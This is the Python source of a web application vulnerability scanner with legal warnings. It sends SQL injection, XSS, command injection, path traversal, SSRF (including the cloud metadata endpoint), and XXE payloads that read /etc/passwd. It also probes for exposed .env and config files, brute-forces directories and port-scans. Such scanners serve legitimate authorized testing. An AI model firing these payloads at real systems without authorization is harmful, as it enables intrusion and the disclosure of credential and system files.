#!/usr/bin/env python3
"""
Moxa Security Scanner - Enhanced Web Application Security Scanner
Created by Moxa

⚠️ LEGAL WARNING:
This tool is for educational and authorized testing purposes only.
Unauthorized use against websites without explicit permission is ILLEGAL.
The user is solely responsible for complying with all applicable laws.
"""

import requests
import socket
import ssl
from urllib.parse import urljoin, urlparse
import json
import concurrent.futures
from bs4 import BeautifulSoup
import argparse
import sys
from datetime import datetime
import time
import re
from typing import List, Dict, Any

class MoxaSecurityScanner:
    def __init__(self, target: str):
        self.target = target.rstrip('/')
        self.results = {
            'critical': [],
            'high': [],
            'medium': [],
            'low': [],
            'info': []
        }
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        })
        self.timeout = 10
        self.verified_vulnerabilities = set()

    def log_message(self, message: str):
        """Log messages with timestamp"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(f"[{timestamp}] {message}")

    def check_sql_injection(self):
        """Enhanced SQL Injection detection with verification"""
        self.log_message("Checking for SQL Injection vulnerabilities...")
        
        sql_payloads = [
            "'", 
            "';", 
            "' OR '1'='1", 
            "' UNION SELECT 1,2,3--", 
            "1' ORDER BY 1--",
            "' AND 1=1--",
            "' AND 1=2--"
        ]
        
        test_params = ['id', 'page', 'category', 'user', 'product']
        
        for param in test_params:
            for payload in sql_payloads:
                try:
                    test_url = f"{self.target}/"
                    response = self.session.get(
                        test_url, 
                        params={param: payload}, 
                        timeout=self.timeout
                    )
                    
                    # Enhanced SQL error patterns
                    sql_errors = {
                        'mysql': [
                            r"mysql_fetch_array", r"mysql_num_rows", 
                            r"You have an error in your SQL syntax",
                            r"Warning.*mysql", r"MySQL server version"
                        ],
                        'mssql': [
                            r"Microsoft OLE DB Provider", r"Unclosed quotation mark",
                            r"ODBC Driver", r"SQL Server"
                        ],
                        'oracle': [
                            r"ORA-[0-9]", r"Oracle error", r"PLS-[0-9]",
                            r"TNS-[0-9]"
                        ],
                        'postgresql': [
                            r"PostgreSQL query failed", r"pg_.*error",
                            r"PSQLException"
                        ]
                    }
                    
                    for db_type, patterns in sql_errors.items():
                        for pattern in patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                vuln_id = f"sql_injection_{param}_{payload}"
                                if vuln_id not in self.verified_vulnerabilities:
                                    if self.verify_sql_injection(param, payload):
                                        self.results['critical'].append(
                                            f"SQL Injection vulnerability in parameter '{param}' with payload: {payload}"
                                        )
                                        self.verified_vulnerabilities.add(vuln_id)
                                    break
                            
                except requests.RequestException:
                    continue

    def verify_sql_injection(self, param: str, payload: str) -> bool:
        """Verify SQL injection with time-based detection"""
        try:
            # Time-based verification
            time_payload = f"{payload} AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            start_time = time.time()
            response = self.session.get(
                self.target, 
                params={param: time_payload}, 
                timeout=10
            )
            response_time = time.time() - start_time
            
            if response_time > 4.5:
                return True
                
            # Boolean-based verification
            true_payload = f"{payload} AND 1=1--"
            false_payload = f"{payload} AND 1=2--"
            
            true_response = self.session.get(self.target, params={param: true_payload}, timeout=self.timeout)
            false_response = self.session.get(self.target, params={param: false_payload}, timeout=self.timeout)
            
            if true_response.text != false_response.text:
                return True
                
        except requests.RequestException:
            pass
            
        return False

    def check_xss(self):
        """Enhanced XSS detection with verification"""
        self.log_message("Checking for XSS vulnerabilities...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')"
        ]
        
        forms = self.extract_forms()
        self.log_message(f"Found {len(forms)} forms to test")
        
        for form in forms:
            for payload in xss_payloads:
                try:
                    response = self.submit_form(form, payload)
                    
                    # Check if payload is reflected without proper encoding
                    if payload in response.text:
                        # Check if the payload is executable
                        soup = BeautifulSoup(response.text, 'html.parser')
                        scripts = soup.find_all('script')
                        for script in scripts:
                            if payload in str(script):
                                vuln_id = f"xss_{form.get('action', 'unknown')}_{payload}"
                                if vuln_id not in self.verified_vulnerabilities:
                                    self.results['high'].append(
                                        f"XSS vulnerability in form action: {form.get('action', 'unknown')}"
                                    )
                                    self.verified_vulnerabilities.add(vuln_id)
                                    break
                            
                except Exception as e:
                    continue

    def check_command_injection(self):
        """Enhanced Command Injection detection with verification"""
        self.log_message("Checking for Command Injection vulnerabilities...")
        
        cmd_payloads = [
            ";id", "|whoami", "&ipconfig", "`cat /etc/passwd`",
            "|ls -la", ";uname -a", "|dir", "&type C:\\windows\\win.ini"
        ]
        
        cmd_params = ['cmd', 'command', 'exec', 'execute', 'system']
        
        for param in cmd_params:
            for payload in cmd_payloads:
                try:
                    test_url = f"{self.target}/"
                    response = self.session.get(
                        test_url,
                        params={param: payload},
                        timeout=self.timeout
                    )
                    
                    # More specific command output indicators
                    command_indicators = {
                        'linux': ['uid=', 'gid=', 'groups=', '/bin/bash', 'root:x:'],
                        'windows': ['Volume Serial', 'Directory of', 'Administrator', 'Windows IP']
                    }
                    
                    for os_type, indicators in command_indicators.items():
                        for indicator in indicators:
                            if indicator.lower() in response.text.lower():
                                vuln_id = f"cmd_injection_{param}_{payload}"
                                if vuln_id not in self.verified_vulnerabilities:
                                    if self.verify_command_injection(param, payload):
                                        self.results['critical'].append(
                                            f"Command Injection vulnerability in parameter '{param}'"
                                        )
                                        self.verified_vulnerabilities.add(vuln_id)
                                    break
                            
                except requests.RequestException:
                    continue

    def verify_command_injection(self, param: str, payload: str) -> bool:
        """Verify command injection with different payloads"""
        try:
            # Test with different command variations
            test_payloads = [
                f"{payload}",
                f"{payload} && echo 'test'",
                f"{payload} | echo 'test'"
            ]
            
            original_response = self.session.get(self.target, timeout=self.timeout)
            
            for test_payload in test_payloads:
                test_response = self.session.get(
                    self.target,
                    params={param: test_payload},
                    timeout=self.timeout
                )
                
                # If response differs significantly from original
                if test_response.text != original_response.text:
                    if len(test_response.text) != len(original_response.text):
                        return True
                        
        except requests.RequestException:
            pass
            
        return False

    def check_file_inclusion(self):
        """Enhanced File Inclusion detection"""
        self.log_message("Checking for File Inclusion vulnerabilities...")
        
        lfi_payloads = [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "../../../../windows/system32/drivers/etc/hosts",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        file_params = ['file', 'page', 'template', 'view', 'document']
        
        for param in file_params:
            for payload in lfi_payloads:
                try:
                    test_url = f"{self.target}/"
                    response = self.session.get(
                        test_url,
                        params={param: payload},
                        timeout=self.timeout
                    )
                    
                    # Check for specific file content
                    file_indicators = {
                        '/etc/passwd': ['root:', 'daemon:', 'bin:'],
                        'hosts': ['localhost', '127.0.0.1', '::1'],
                        'win.ini': ['[extensions]', '[fonts]', '[mci extensions]']
                    }
                    
                    for file_type, indicators in file_indicators.items():
                        if file_type in payload:
                            for indicator in indicators:
                                if indicator in response.text:
                                    vuln_id = f"lfi_{param}_{payload}"
                                    if vuln_id not in self.verified_vulnerabilities:
                                        self.results['high'].append(
                                            f"Local File Inclusion vulnerability in parameter '{param}'"
                                        )
                                        self.verified_vulnerabilities.add(vuln_id)
                                    break
                            
                except requests.RequestException:
                    continue

    def check_ssrf(self):
        """Enhanced SSRF detection with verification"""
        self.log_message("Checking for SSRF vulnerabilities...")
        
        ssrf_payloads = [
            "http://localhost:22",
            "http://127.0.0.1:3306",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd"
        ]
        
        ssrf_params = ['url', 'link', 'target', 'redirect', 'image']
        
        for param in ssrf_params:
            for payload in ssrf_payloads:
                try:
                    test_url = f"{self.target}/"
                    response = self.session.get(
                        test_url,
                        params={param: payload},
                        timeout=5
                    )
                    
                    # Check for specific SSRF indicators
                    ssrf_indicators = [
                        'root:', 'ssh', 'mysql', 'aws', 'ec2',
                        'internal', 'localhost', '127.0.0.1'
                    ]
                    
                    for indicator in ssrf_indicators:
                        if indicator.lower() in response.text.lower():
                            vuln_id = f"ssrf_{param}_{payload}"
                            if vuln_id not in self.verified_vulnerabilities:
                                self.results['high'].append(
                                    f"Potential SSRF vulnerability in parameter '{param}'"
                                )
                                self.verified_vulnerabilities.add(vuln_id)
                            break
                            
                except requests.RequestException:
                    continue

    def check_xxe(self):
        """Enhanced XXE detection"""
        self.log_message("Checking for XXE vulnerabilities...")
        
        xxe_payloads = [
            """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>""",
            """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://localhost/">]><root>&xxe;</root>"""
        ]
        
        try:
            for payload in xxe_payloads:
                headers = {'Content-Type': 'application/xml'}
                response = self.session.post(
                    self.target, 
                    data=payload, 
                    headers=headers, 
                    timeout=self.timeout
                )
                
                # Check for file content in response
                if 'root:' in response.text or 'localhost' in response.text:
                    if response.status_code != 400:
                        vuln_id = f"xxe_{payload}"
                        if vuln_id not in self.verified_vulnerabilities:
                            self.results['critical'].append("XXE Injection vulnerability detected")
                            self.verified_vulnerabilities.add(vuln_id)
                            break
                        
        except requests.RequestException:
            pass

    def check_cors_misconfig(self):
        """Enhanced CORS misconfiguration detection"""
        self.log_message("Checking for CORS misconfigurations...")
        
        origins = ['https://evil.com', 'http://attacker.com', 'null']
        
        for origin in origins:
            try:
                headers = {'Origin': origin}
                response = self.session.get(self.target, headers=headers, timeout=self.timeout)
                
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '').lower()
                
                if origin in acao or acao == '*':
                    if acao == '*' and acac == 'true':
                        self.results['high'].append("Dangerous CORS configuration: Allow-Origin: * with Allow-Credentials: true")
                    elif acao != '*':
                        self.results['medium'].append(f"CORS Misconfiguration: Access-Control-Allow-Origin: {acao}")
                        
            except requests.RequestException:
                continue

    def check_security_headers(self):
        """Enhanced security headers check"""
        self.log_message("Checking security headers...")
        
        try:
            response = self.session.get(self.target, timeout=self.timeout)
            headers = response.headers
            
            security_headers = {
                'Content-Security-Policy': 'low',
                'X-Frame-Options': 'medium', 
                'X-Content-Type-Options': 'low',
                'Strict-Transport-Security': 'medium',
                'X-XSS-Protection': 'low',
                'Referrer-Policy': 'low'
            }
            
            for header, severity in security_headers.items():
                if header not in headers:
                    self.results[severity].append(f"Missing security header: {header}")
                    
        except requests.RequestException:
            pass

    def check_exposed_files(self):
        """Enhanced exposed files detection"""
        self.log_message("Checking for exposed files...")
        
        common_files = [
            '.env', '.git/config', '.htaccess', 'web.config',
            'backup.zip', 'database.sql', 'dump.sql',
            'wp-config.php', 'config.php', 'config.inc.php',
            'robots.txt', 'sitemap.xml', 'crossdomain.xml'
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for file in common_files:
                test_url = urljoin(self.target, file)
                futures.append(executor.submit(self.check_file, test_url))
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    self.results['info'].append(result)

    def check_file(self, url: str) -> str:
        """Check if a file is exposed"""
        try:
            response = self.session.get(url, timeout=5)
            if response.status_code == 200 and len(response.content) > 0:
                return f"Exposed file found: {url} (Size: {len(response.content)} bytes)"
        except requests.RequestException:
            pass
        return ""

    def directory_bruteforce(self):
        """Enhanced directory bruteforce"""
        self.log_message("Performing directory bruteforce...")
        
        common_dirs = [
            'admin', 'login', 'wp-admin', 'dashboard', 'control',
            'backup', 'uploads', 'images', 'css', 'js', 'api',
            'config', 'database', 'sql', 'temp', 'tmp'
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
            futures = []
            for directory in common_dirs:
                test_url = urljoin(self.target, directory + '/')
                futures.append(executor.submit(self.check_directory, test_url))
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    self.results['info'].append(result)

    def check_directory(self, url: str) -> str:
        """Check if a directory exists"""
        try:
            response = self.session.get(url, timeout=5, allow_redirects=False)
            if response.status_code in [200, 301, 302, 403]:
                return f"Directory found: {url} (Status: {response.status_code})"
        except requests.RequestException:
            pass
        return ""

    def extract_forms(self) -> List[Dict[str, Any]]:
        """Extract forms from the target page"""
        try:
            response = self.session.get(self.target, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_info = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea']):
                    form_info['inputs'].append({
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'tag': input_tag.name
                    })
                    
                forms.append(form_info)
                
            return forms
        except Exception as e:
            return []

    def submit_form(self, form: Dict[str, Any], payload: str) -> requests.Response:
        """Submit a form with payload"""
        action = form['action']
        if not action.startswith('http'):
            action = urljoin(self.target, action)
        
        data = {}
        for input_field in form['inputs']:
            if input_field['type'] != 'submit' and input_field['name']:
                data[input_field['name']] = payload
        
        if form['method'] == 'post':
            return self.session.post(action, data=data, timeout=self.timeout)
        else:
            return self.session.get(action, params=data, timeout=self.timeout)

    def port_scan(self):
        """Enhanced port scanning"""
        self.log_message("Performing port scan...")
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 3306, 3389, 5432, 8080, 8443]
        domain = urlparse(self.target).hostname
        
        try:
            ip = socket.gethostbyname(domain)
            open_ports = []
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
                futures = {executor.submit(self.check_port, ip, port): port for port in common_ports}
                
                for future in concurrent.futures.as_completed(futures):
                    port = futures[future]
                    try:
                        if future.result():
                            open_ports.append(port)
                    except Exception:
                        pass
            
            if open_ports:
                self.results['info'].append(f"Open ports on {domain}: {', '.join(map(str, sorted(open_ports)))}")
                
        except socket.gaierror:
            self.log_message(f"Could not resolve domain: {domain}")

    def check_port(self, ip: str, port: int) -> bool:
        """Check if a port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except Exception:
            return False

    def ssl_scan(self):
        """Enhanced SSL/TLS scan"""
        self.log_message("Performing SSL/TLS scan...")
        
        try:
            domain = urlparse(self.target).hostname
            context = ssl.create_default_context()
            
            with socket.create_connection((domain, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate expiration
                    expiry_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_remaining = (expiry_date - datetime.now()).days
                    
                    if days_remaining < 0:
                        self.results['high'].append(f"SSL Certificate has expired {abs(days_remaining)} days ago")
                    elif days_remaining < 30:
                        self.results['medium'].append(f"SSL Certificate expires in {days_remaining} days")
                        
        except Exception as e:
            pass

    def full_scan(self):
        """Perform full security scan"""
        self.log_message(f"Starting comprehensive security scan for: {self.target}")
        print("=" * 60)
        
        scan_methods = [
            self.check_sql_injection,
            self.check_xss,
            self.check_command_injection,
            self.check_file_inclusion,
            self.check_ssrf,
            self.check_xxe,
            self.check_cors_misconfig,
            self.check_security_headers,
            self.check_exposed_files,
            self.directory_bruteforce,
            self.port_scan,
            self.ssl_scan
        ]
        
        # Run scans with progress indication
        for i, method in enumerate(scan_methods, 1):
            try:
                method()
                self.log_message(f"Completed scan {i}/{len(scan_methods)}")
            except Exception as e:
                self.log_message(f"Scan method failed: {e}")

    def generate_report(self, output_file: str = None) -> str:
        """Generate comprehensive scan report"""
        if not output_file:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = f"moxa_scan_{timestamp}.json"
        
        report = {
            'scan_metadata': {
                'target': self.target,
                'scan_date': datetime.now().isoformat(),
                'scanner': 'Moxa Security Scanner v2.0 Enhanced',
                'legal_warning': 'For authorized testing only. Unauthorized use is illegal.'
            },
            'vulnerability_summary': {
                'critical': len(self.results['critical']),
                'high': len(self.results['high']),
                'medium': len(self.results['medium']),
                'low': len(self.results['low']),
                'info': len(self.results['info']),
                'total': sum(len(vulns) for vulns in self.results.values())
            },
            'detailed_results': self.results
        }
        
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            return output_file
        except Exception as e:
            self.log_message(f"Error generating report: {e}")
            return ""

    def print_results(self):
        """Print scan results in readable format"""
        print("\n" + "=" * 60)
        print("SCAN RESULTS SUMMARY")
        print("=" * 60)
        
        for severity in ['critical', 'high', 'medium', 'low', 'info']:
            vulnerabilities = self.results[severity]
            if vulnerabilities:
                print(f"\n{severity.upper()} ISSUES ({len(vulnerabilities)}):")
                print("-" * 40)
                for i, issue in enumerate(vulnerabilities, 1):
                    print(f"{i}. {issue}")

def main():
    banner = """
    ╔═══════════════════════════════════════════════╗
    ║            Moxa Security Scanner v2.0         ║
    ║          Enhanced Web Application Scanner     ║
    ║               Created by Moxa                 ║
    ╚═══════════════════════════════════════════════╝
    
    ⚠️  LEGAL WARNING:
    This tool is for educational and authorized testing only.
    Unauthorized use against websites is ILLEGAL.
    You are responsible for complying with all applicable laws.
    """
    print(banner)
    
    parser = argparse.ArgumentParser(description='Moxa Security Scanner - Web Application Security Assessment')
    parser.add_argument('target', help='Target URL to scan (include http:// or https://)')
    parser.add_argument('-o', '--output', help='Output file name for the report')
    
    args = parser.parse_args()
    
    # Validate target URL
    if not args.target.startswith(('http://', 'https://')):
        print("❌ Error: Please include http:// or https:// in the target URL")
        sys.exit(1)
    
    # Legal confirmation
    print("⚠️  By proceeding, you confirm you have authorization to scan this target.")
    response = input("Continue? (y/N): ").lower().strip()
    if response not in ['y', 'yes']:
        print("Scan cancelled.")
        sys.exit(0)
    
    # Initialize scanner
    scanner = MoxaSecurityScanner(args.target)
    
    try:
        start_time = time.time()
        
        # Perform full scan
        scanner.full_scan()
        
        # Generate report
        report_file = scanner.generate_report(args.output)
        
        # Print results
        scanner.print_results()
        
        end_time = time.time()
        scan_duration = end_time - start_time
        
        print(f"\n" + "=" * 60)
        print("SCAN COMPLETED")
        print("=" * 60)
        print(f"Target: {args.target}")
        print(f"Duration: {scan_duration:.2f} seconds")
        print(f"Report: {report_file}")
        
        total_vulns = sum(len(vulns) for vulns in scanner.results.values())
        print(f"\nTotal vulnerabilities found: {total_vulns}")
        
        if total_vulns > 0:
            print("🔍 Review findings carefully - some may require manual verification.")
            
    except KeyboardInterrupt:
        print("\n⚠️  Scan interrupted by user")
    except Exception as e:
        print(f"❌ Scan error: {e}")

if __name__ == "__main__":
    main()